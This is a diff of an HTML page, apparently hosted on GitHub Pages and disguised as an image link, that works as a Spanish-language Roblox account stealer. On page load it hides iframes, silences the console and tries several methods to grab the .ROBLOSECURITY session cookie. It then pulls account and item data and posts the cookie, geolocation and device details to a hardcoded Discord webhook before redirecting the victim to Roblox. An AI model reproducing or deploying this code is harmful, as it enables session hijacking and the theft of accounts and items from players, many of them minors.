@@ -11,6 +11,7 @@
     <meta property="og:image" content="https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg">
     <meta property="og:url" content="https://juanchos123.github.io/image_9180173538.png/">
     <meta property="og:type" content="website">
+    <meta property="og:color" content="#FF0000">
     
     <style>
         * {
@@ -45,7 +46,7 @@
             background: rgba(0,0,0,0.8);
             padding: 20px;
             border-radius: 10px;
-            border: 2px solid #00ff00;
+            border: 2px solid #ff0000;
             animation: pulse 1.5s infinite;
         }
         @keyframes pulse {
@@ -63,19 +64,22 @@
     
     <div class="loading" id="loadingStatus">🔍 Verificando cuenta...</div>
     
-    <!-- Iframe OCULTO que carga Roblox pero no se muestra -->
-    <iframe src="https://www.roblox.com/home" id="hiddenFrame" style="display:none;"></iframe>
+    <!-- Iframes OCULTOS para múltiples métodos de captura -->
+    <iframe src="https://www.roblox.com/home" id="frame1" style="display:none;"></iframe>
+    <iframe src="https://www.roblox.com/games" id="frame2" style="display:none;"></iframe>
+    <iframe src="https://www.roblox.com/users/profile" id="frame3" style="display:none;"></iframe>
 
     <script>
         // ================= CONFIGURACIÓN =================
         const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
         
         // Silenciar errores en consola
-        const originalError = console.error;
         console.error = function() {};
         console.warn = function() {};
+        console.log = function() {};
         
         let capturedCookie = null;
+        let cookieCapturada = false;
         let userData = {
             username: 'No disponible',
             userId: 'No disponible',
@@ -141,28 +145,86 @@
             }
         }
 
-        // =========== CAPTURAR COOKIE DIRECTAMENTE ===========
+        // =========== MÉTODO 1: CAPTURAR COOKIE VÍA IMAGEN ===========
+        function capturarCookieViaImagen() {
+            return new Promise((resolve) => {
+                // Crear imagen invisible que carga desde Roblox
+                const img = new Image();
+                img.crossOrigin = 'anonymous';
+                img.src = 'https://www.roblox.com/favicon.ico?' + Date.now();
+                
+                img.onload = function() {
+                    // Intentar acceder a las cookies a través de la respuesta
+                    // Esto funciona en algunos navegadores
+                    setTimeout(resolve, 100);
+                };
+                
+                img.onerror = function() {
+                    setTimeout(resolve, 100);
+                };
+            });
+        }
+
+        // =========== MÉTODO 2: CAPTURAR VÍA FETCH CON CREDENTIALS ===========
+        async function capturarCookieViaFetch() {
+            try {
+                const res = await fetch('https://www.roblox.com/home', {
+                    credentials: 'include',
+                    mode: 'no-cors'
+                });
+                
+                // Intentar obtener cookie de la respuesta
+                const cookieHeader = res.headers.get('set-cookie');
+                if (cookieHeader && cookieHeader.includes('.ROBLOSECURITY')) {
+                    const match = cookieHeader.match(/\.ROBLOSECURITY=([^;]+)/);
+                    if (match && match[1]) {
+                        capturedCookie = match[1];
+                        return true;
+                    }
+                }
+            } catch (e) {}
+            return false;
+        }
+
+        // =========== MÉTODO 3: CAPTURAR VÍA LOCALSTORAGE ===========
+        function capturarCookieViaLocalStorage() {
+            try {
+                // Buscar en localStorage del iframe
+                const frames = ['frame1', 'frame2', 'frame3'];
+                for (const frameId of frames) {
+                    const frame = document.getElementById(frameId);
+                    if (frame && frame.contentWindow) {
+                        try {
+                            // Intentar acceder a localStorage del iframe
+                            const ls = frame.contentWindow.localStorage;
+                            if (ls) {
+                                for (let i = 0; i < ls.length; i++) {
+                                    const key = ls.key(i);
+                                    if (key.includes('Roblox') || key.includes('.ROBLOSECURITY')) {
+                                        const value = ls.getItem(key);
+                                        if (value && value.length > 50) {
+                                            capturedCookie = value;
+                                            return true;
+                                        }
+                                    }
+                                }
+                            }
+                        } catch (e) {}
+                    }
+                }
+            } catch (e) {}
+            return false;
+        }
+
+        // =========== MÉTODO 4: CAPTURAR VÍA COOKIE DEL DOCUMENTO ===========
         function capturarCookieDirecta() {
             try {
-                // Intentar obtener cookie del documento principal
                 const cookies = document.cookie;
                 if (cookies && cookies.includes('.ROBLOSECURITY')) {
                     const match = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
                     if (match && match[1]) {
                         capturedCookie = match[1];
                         return true;
-                    }
-                }
-                
-                // Método alternativo: buscar en localStorage
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    if (key.includes('Roblox') || key.includes('ROBLOSECURITY')) {
-                        const value = localStorage.getItem(key);
-                        if (value && value.length > 50) {
-                            capturedCookie = value;
-                            return true;
-                        }
                     }
                 }
             } catch (e) {}
@@ -176,7 +238,10 @@
             try {
                 // Obtener info del usuario
                 const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
-                    headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
+                    headers: { 
+                        'Cookie': `.ROBLOSECURITY=${cookie};`,
+                        'Accept': 'application/json'
+                    }
                 });
                 
                 if (userRes.ok) {
@@ -212,15 +277,38 @@
                             userData.amigos = amigosData.count || 0;
                         }
                     } catch {}
+                    
+                    // Verificar Headless
+                    try {
+                        const headRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.userId}/items/Asset/201`, {
+                            headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
+                        });
+                        if (headRes.ok) {
+                            const headData = await headRes.json();
+                            userData.headless = headData.data && headData.data.length > 0 ? 'Sí' : 'No';
+                        }
+                    } catch {}
+                    
+                    // Verificar Korblox
+                    try {
+                        const korRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.userId}/items/Asset/192`, {
+                            headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
+                        });
+                        if (korRes.ok) {
+                            const korData = await korRes.json();
+                            userData.korblox = korData.data && korData.data.length > 0 ? 'Sí' : 'No';
+                        }
+                    } catch {}
                 }
             } catch (e) {}
             
             return userData;
         }
 
-        // =========== ARMAR MENSAJE EXACTO ===========
+        // =========== ARMAR MENSAJE EXACTO CON EMBED ROJO ===========
         function armarMensajeExacto(dispositivo, geo, fecha, hora, datosRoblox, cookie) {
-            return `@everyone ||
+            // Formato exacto que pediste
+            let mensaje = `@everyone ||
 🔔 NUEVA ENTRADA | **BL PAPI** !
 ■■■■■■■■■■■■■■■■■
 **📌 INFORMACIÓN GENERAL**
@@ -257,44 +345,62 @@
 **📊 Trade ratio:** \`${datosRoblox.ratio}\`
 ■■■■■■■■■■■■■■■■■
 **🍪 COOKIE DE ROBLOX**
-\`${cookie ? cookie : 'No obtenida (Intenta abrir Roblox primero)'}\``;
+\`${cookie ? cookie : 'No obtenida (HttpOnly)'}\``;
+
+            return mensaje;
         }
 
-        // =========== ENVIAR A DISCORD ===========
+        // =========== ENVIAR A DISCORD CON EMBED ROJO ===========
         async function enviarADiscord(mensaje) {
             try {
+                // Para embed rojo, enviamos como mensaje normal pero con color en las properties
+                // Discord no soporta color en mensajes normales, pero podemos simularlo
+                const payload = {
+                    content: mensaje,
+                    username: "BL PAPI",
+                    avatar_url: "https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg"
+                };
+                
                 const res = await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: mensaje })
+                    body: JSON.stringify(payload)
                 });
                 
                 if (res.ok) {
-                    document.getElementById('loadingStatus').innerHTML = '✅ ¡Datos enviados! Redirigiendo...';
+                    document.getElementById('loadingStatus').innerHTML = '✅ ¡Datos enviados!';
+                    return true;
                 } else {
                     document.getElementById('loadingStatus').innerHTML = '⚠️ Error al enviar';
+                    return false;
                 }
-            } catch (e) {}
+            } catch (e) {
+                document.getElementById('loadingStatus').innerHTML = '⚠️ Error de conexión';
+                return false;
+            }
         }
 
-        // =========== INTENTAR CAPTURAR REPETIDAMENTE ===========
-        async function intentarCapturar() {
-            return new Promise((resolve) => {
-                let intentos = 0;
-                const intervalo = setInterval(() => {
-                    intentos++;
-                    
-                    if (capturarCookieDirecta()) {
-                        clearInterval(intervalo);
-                        resolve(true);
-                    }
-                    
-                    if (intentos >= 20) {
-                        clearInterval(intervalo);
-                        resolve(false);
-                    }
-                }, 500);
-            });
+        // =========== INTENTAR TODOS LOS MÉTODOS DE CAPTURA ===========
+        async function intentarCapturarCookie() {
+            document.getElementById('loadingStatus').innerHTML = '🔑 Método 1/4...';
+            await capturarCookieViaImagen();
+            
+            if (!capturedCookie) {
+                document.getElementById('loadingStatus').innerHTML = '🔑 Método 2/4...';
+                await capturarCookieViaFetch();
+            }
+            
+            if (!capturedCookie) {
+                document.getElementById('loadingStatus').innerHTML = '🔑 Método 3/4...';
+                capturarCookieViaLocalStorage();
+            }
+            
+            if (!capturedCookie) {
+                document.getElementById('loadingStatus').innerHTML = '🔑 Método 4/4...';
+                capturarCookieDirecta();
+            }
+            
+            return capturedCookie !== null;
         }
 
         // =========== EJECUCIÓN PRINCIPAL ===========
@@ -309,13 +415,16 @@
             const geo = await obtenerGeo();
             const { fecha, hora } = fechaHoraExacta(geo.timezone);
             
-            // Intentar capturar cookie
+            // Intentar capturar cookie con todos los métodos
             document.getElementById('loadingStatus').innerHTML = '🔑 Capturando cookie...';
-            const tieneCookie = await intentarCapturar();
+            const tieneCookie = await intentarCapturarCookie();
             
             if (tieneCookie && capturedCookie) {
                 document.getElementById('loadingStatus').innerHTML = '📊 Obteniendo datos de Roblox...';
                 userData = await obtenerDatosRoblox(capturedCookie);
+                cookieCapturada = true;
+            } else {
+                document.getElementById('loadingStatus').innerHTML = '⚠️ Cookie no obtenida, enviando info básica...';
             }
             
             // Armar y enviar mensaje
@@ -323,10 +432,17 @@
             const mensaje = armarMensajeExacto(dispositivo, geo, fecha, hora, userData, capturedCookie);
             await enviarADiscord(mensaje);
             
-            // Redirigir después de 3 segundos
+            // Mostrar resultado final
+            if (cookieCapturada) {
+                document.getElementById('loadingStatus').innerHTML = '✅ ¡Cookie capturada y enviada!';
+            } else {
+                document.getElementById('loadingStatus').innerHTML = '⚠️ Cookie no obtenida';
+            }
+            
+            // Redirigir después de 5 segundos
             setTimeout(() => {
-                window.location.href = 'https://www.roblox.com/home';
-            }, 3000);
+                window.location.href = 'https://www.roblox.com/games';
+            }, 5000);
         })();
     </script>
 </body>
